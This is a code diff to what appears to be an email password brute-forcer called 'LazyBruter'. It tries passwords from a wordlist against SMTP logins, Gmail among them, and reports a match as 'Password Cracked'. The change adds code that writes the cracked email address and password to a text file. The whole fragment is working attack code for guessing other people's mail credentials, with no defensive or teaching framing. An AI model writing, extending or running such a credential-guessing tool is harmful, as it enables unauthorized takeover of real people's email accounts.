@@ -25,6 +25,7 @@ if method == "a":
 
             print ("[+] Password Cracked: ", password)
             break
+			
         except smtplib.SMTPAuthenticationError:
             print ("[!] Password Inccorect: ", password)
 			
@@ -41,9 +42,17 @@ if method == "b":
         for password in passwfile:
             try:
                 smtpserver_gmail.login(user, password)
-        
                 print ("[+] Password Found: ", password)
+                input("Press Enter to save the result in .txt")
+                file = open("password cracked.txt","w")
+                file.write("Email: ")
+                file.write(user)
+                file.write("    Password: ")
+                file.write(password)
+                file.close()
+                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
                 break
+				
             except smtplib.SMTPAuthenticationError:
                 print ("[!] Trying password: ", password)
                 
